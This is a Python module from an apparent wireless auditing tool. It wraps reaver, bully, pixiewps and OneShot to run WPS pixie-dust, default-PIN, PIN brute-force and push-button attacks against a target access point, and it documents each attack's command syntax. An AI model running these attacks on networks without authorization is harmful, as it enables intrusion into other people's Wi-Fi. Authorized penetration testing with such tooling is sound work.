"""WPS tool wrappers: wash, reaver, bully, pixiewps, oneshot.

These wrap the Kali WPS auditing toolchain. The *assessment* is driven by
:mod:`handshaker.core.wps`; these wrappers only build the correct argv.

Tool syntax (verified against upstream docs, incl. reaver-wps-fork-t6x,
bully v1.4, pixiewps, OneShot):

* ``wash -i IFACE [-c CH] [-a] [-C]``            — scan for WPS APs
* ``reaver -i IFACE -b BSSID -c CH -K 1``        — pixie-dust (offline)
* ``reaver -i IFACE -b BSSID -c CH -P``          — pixie-loop (hash collection)
* ``reaver -i IFACE -b BSSID -c CH -W 1|2``      — default PIN (1=Belkin, 2=D-Link)
* ``reaver -i IFACE -b BSSID -c CH -p PIN``      — known PIN test
* ``reaver -i IFACE -b BSSID -c CH -vv``         — online PIN brute force
* ``bully IFACE -b BSSID -c CH -d``              — pixie-dust (bully engine)
* ``bully IFACE -b BSSID -c CH -g 1|2``          — default PIN (1=D-Link, 2=Belkin)
* ``pixiewps -e PKE -r PKR -s H1 -z H2 -a AUTH -n ENONCE [--mode N] [-f]``
* ``oneshot.py -i IFACE -b BSSID -K``            — pixie-dust (no monitor mode)
* ``oneshot.py -i IFACE -b BSSID -F``            — pixie-force
* ``oneshot.py -i IFACE --pbc``                  — push-button connect

None of these perform WPA password cracking; they exercise the WPS protocol to
determine *vulnerability* within an authorized engagement.
"""

from __future__ import annotations

from ..constants import TOOL_BULLY, TOOL_PIXIEWPS, TOOL_REAVER
from ..utils.proc import ProcResult, run
from .base import Tool


class Reaver(Tool):
    name = TOOL_REAVER

    def _base(self, interface: str, bssid: str, channel: str | None) -> list[str]:
        args = [self.path, "-i", interface, "-b", bssid]
        if channel is not None:
            args += ["-c", channel]
        return args

    def pixie_dust(self, interface: str, bssid: str, *, channel: str | None = None,
                   timeout: int = 120) -> ProcResult:
        """Pixie-dust offline attack (``-K 1``)."""
        args = self._base(interface, bssid, channel) + ["-K", "1", "-vv"]
        return run(args, timeout=timeout, check=False)

    def pixie_loop(self, interface: str, bssid: str, *, channel: str | None = None,
                   timeout: int = 120) -> ProcResult:
        """PixieLoop mode (``-P``): collect PixieHashes without sending M4.

        Breaks the WPS protocol by not completing M4, which can avoid AP
        lockout while harvesting hashes for offline pixiewps.
        """
        args = self._base(interface, bssid, channel) + ["-P", "-vv"]
        return run(args, timeout=timeout, check=False)

    def default_pin(self, interface: str, bssid: str, vendor: int, *,
                    channel: str | None = None, timeout: int = 120) -> ProcResult:
        """Default-PIN attack (``-W``): 1=Belkin, 2=D-Link computed PIN."""
        if vendor not in (1, 2):
            raise ValueError("vendor must be 1 (Belkin) or 2 (D-Link)")
        args = self._base(interface, bssid, channel) + ["-W", str(vendor), "-vv"]
        return run(args, timeout=timeout, check=False)

    def known_pin(self, interface: str, bssid: str, pin: str, *,
                  channel: str | None = None, timeout: int = 120) -> ProcResult:
        """Test a specific known PIN (``-p``)."""
        args = self._base(interface, bssid, channel) + ["-p", pin, "-vv"]
        return run(args, timeout=timeout, check=False)

    def brute_force(self, interface: str, bssid: str, *, channel: str | None = None,
                    timeout: int = 300) -> ProcResult:
        """Full online WPS PIN brute force (NOT a vulnerability test)."""
        args = self._base(interface, bssid, channel) + ["-vv"]
        return run(args, timeout=timeout, check=False)


class Bully(Tool):
    name = TOOL_BULLY

    def pixie_dust(self, interface: str, bssid: str, *, channel: str | None = None,
                   timeout: int = 120) -> ProcResult:
        """Pixie-dust via bully (``-d``)."""
        args = [self.path, interface, "-b", bssid]
        if channel is not None:
            args += ["-c", channel]
        args += ["-d", "-v", "3"]
        return run(args, timeout=timeout, check=False)

    def default_pin(self, interface: str, bssid: str, vendor: int, *,
                    channel: str | None = None, timeout: int = 120) -> ProcResult:
        """Default-PIN attack via bully (``-g``): 1=D-Link, 2=Belkin."""
        if vendor not in (1, 2):
            raise ValueError("vendor must be 1 (D-Link) or 2 (Belkin)")
        args = [self.path, interface, "-b", bssid]
        if channel is not None:
            args += ["-c", channel]
        args += ["-g", str(vendor), "-v", "3"]
        return run(args, timeout=timeout, check=False)


class Pixiewps(Tool):
    name = TOOL_PIXIEWPS

    def offline(
        self,
        *,
        pke: str,
        pkr: str,
        e_hash1: str,
        e_hash2: str,
        authkey: str,
        e_nonce: str,
        r_nonce: str | None = None,
        mode: str | None = None,
        force: bool = False,
    ) -> ProcResult:
        """Run pixiewps offline against a captured M1-M3 exchange.

        Correct flag mapping (verified against pixiewps usage):
          -e PKE, -r PKR, -s e-hash1, -z e-hash2, -a authkey, -n e-nonce,
          -m r-nonce (registrar nonce, OPTIONAL — NOT mode),
          --mode N (vendor mode; omitted = auto-detect),
          -f / --force (full-range brute, mode 3 only).
        """
        args = [
            self.path,
            "-e", pke,
            "-r", pkr,
            "-s", e_hash1,
            "-z", e_hash2,
            "-a", authkey,
            "-n", e_nonce,
        ]
        if r_nonce:
            args += ["-m", r_nonce]
        if mode is not None:
            args += ["--mode", str(mode)]
        if force:
            args += ["-f"]
        return run(args, timeout=120, check=False)


class Oneshot(Tool):
    """OneShot: WPS attacks without monitor mode (uses wpa_supplicant).

    ``oneshot`` / ``oneshot.py`` is a standalone script; resolve via PATH or
    the ``tools.overrides`` config. Pixie dust, pixie force, online brute force,
    and push-button connect are all supported.
    """

    name = "oneshot"

    def pixie_dust(self, interface: str, bssid: str, *, timeout: int = 120) -> ProcResult:
        return run([self.path, "-i", interface, "-b", bssid, "-K"],
                   timeout=timeout, check=False)

    def pixie_force(self, interface: str, bssid: str, *, timeout: int = 180) -> ProcResult:
        return run([self.path, "-i", interface, "-b", bssid, "-F"],
                   timeout=timeout, check=False)

    def bruteforce(self, interface: str, bssid: str, *, pin: str | None = None,
                   timeout: int = 300) -> ProcResult:
        args = [self.path, "-i", interface, "-b", bssid, "-B"]
        if pin:
            args += ["-p", pin]
        return run(args, timeout=timeout, check=False)

    def push_button(self, interface: str, *, bssid: str | None = None,
                    timeout: int = 120) -> ProcResult:
        args = [self.path, "-i", interface, "--pbc"]
        if bssid:
            args += ["-b", bssid]
        return run(args, timeout=timeout, check=False)
